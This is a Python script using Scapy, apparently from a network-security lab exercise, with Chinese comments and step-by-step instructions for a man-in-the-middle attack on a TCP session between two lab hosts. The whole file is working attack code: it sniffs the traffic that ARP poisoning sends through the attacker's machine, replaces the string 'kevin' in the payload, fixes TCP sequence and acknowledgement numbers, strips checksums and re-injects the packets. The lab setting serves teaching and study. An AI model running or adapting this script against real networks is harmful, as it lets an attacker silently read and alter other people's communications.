#! /usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *

# A ----> B 发信息
# M 为中间人

# 1.运行arp_poisoning_mitm.py
# 2.打开流量转发
# 3.在A，B上运行nc
# 4.关闭流量转发
# 5.在M上运行MITM_attack.py
# 6.在A 上发信息

# 根据提示输入参数
# Machine A:
IP_A = "192.168.60.2"
MAC_A = "02:42:c0:a8:3c:02"

# Machine Server2:
IP_B = "10.0.2.7"
MAC_B = "02:42:22:05:fa:2e"  # Server2的MAC地址即为网关192.168.60.1的MAC地址

# Machine M:
IP_M = "192.168.60.3"
MAC_M = "02:42:c0:a8:3c:03"
old_str = "kevin"
new_str = "kevin_spoofed"
# --------------------------------------------------

add_num = 0  # 因字符串长度修改递增的数字
print("Starting MITM attack...")


# del checksum and IP len
def delete_chksum(pkt):
    del pkt[IP].len  # 删除IP长度
    del pkt[IP].chksum  # 删除IP校验和
    del pkt[TCP].chksum  # 删除TCP校验和
    del pkt.chksum  # 删除Ethernet校验和
    return pkt


def spoof_pkt(pkt):
    global add_num
    try:
        # 判断是否是本机发出的包
        if pkt.src == MAC_M:
            return
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            # 判断是否是A->B的包
            pkt[TCP].seq = pkt[TCP].seq + add_num  # 增加序号
            pkt[Ether].src = MAC_M  # 修改源地址
            pkt[Ether].dst = MAC_B  # 修改目的地址
            old_data = pkt[TCP].load  # 获取原始数据
            print("old_data is:" + old_data)  # 打印原始数据
            new_data = old_data.replace(old_str, new_str)  # 替换数据
            print("new_data is:" + new_data)  # 打印新数据
            add_num = add_num + len(new_data) - len(old_data)  # 增加add_num
            del pkt[IP].load  # 删除原始数据
            pkt = pkt / new_data  # 添加新数据
        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
            # 判断是否是B->A的包
            pkt[TCP].ack = pkt[TCP].ack - add_num  # 减少序号
            pkt[Ether].src = MAC_M  # 修改源地址
            pkt[Ether].dst = MAC_A  # 修改目的地址
        pkt = delete_chksum(pkt)  # 删除校验和
        sendp(pkt, verbose=0)  # 发送数据
    except Exception as e:
        print(e)


if __name__ == "__main__":
    f = "host {} and host {} and tcp".format(IP_A, IP_B)  # 指定抓包的目的地址与源地址
    sniff(prn=spoof_pkt, filter=f)
